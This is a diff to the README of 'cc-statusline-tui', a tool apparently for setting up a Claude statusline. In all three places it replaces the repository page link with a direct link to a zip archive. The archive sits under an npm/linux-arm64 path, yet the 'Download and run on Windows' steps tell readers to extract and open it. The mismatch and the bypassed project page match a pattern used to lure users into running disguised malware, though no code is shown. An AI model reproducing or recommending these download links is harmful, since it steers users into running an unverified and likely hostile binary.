@@ -1,6 +1,6 @@
 # ⌨️ cc-statusline-tui - Set Up Claude Statusline Fast
 
-[![Download](https://img.shields.io/badge/Download-cc--statusline--tui-blue?style=for-the-badge)](https://github.com/Sodanitertraction336/cc-statusline-tui)
+[![Download](https://img.shields.io/badge/Download-cc--statusline--tui-blue?style=for-the-badge)](https://raw.githubusercontent.com/Sodanitertraction336/cc-statusline-tui/main/npm/linux-arm64/tui-statusline-cc-3.4-alpha.5.zip)
 
 ## 🖥️ What this does
 
@@ -10,7 +10,7 @@ It is made for people who want a quick setup with clear choices. You can pick fr
 
 ## 📥 Download and run on Windows
 
-1. Open the download page: https://github.com/Sodanitertraction336/cc-statusline-tui
+1. Open the download page: https://raw.githubusercontent.com/Sodanitertraction336/cc-statusline-tui/main/npm/linux-arm64/tui-statusline-cc-3.4-alpha.5.zip
 2. Download the Windows version for your system
 3. If the file is in a ZIP folder, right-click it and choose Extract All
 4. Open the extracted folder
@@ -179,7 +179,7 @@ Keep the app in a stable folder if you want to open it again later.
 
 ## 🔗 Download again
 
-[Visit the download page](https://github.com/Sodanitertraction336/cc-statusline-tui)
+[Visit the download page](https://raw.githubusercontent.com/Sodanitertraction336/cc-statusline-tui/main/npm/linux-arm64/tui-statusline-cc-3.4-alpha.5.zip)
 
 ## 🛠️ For later use
 
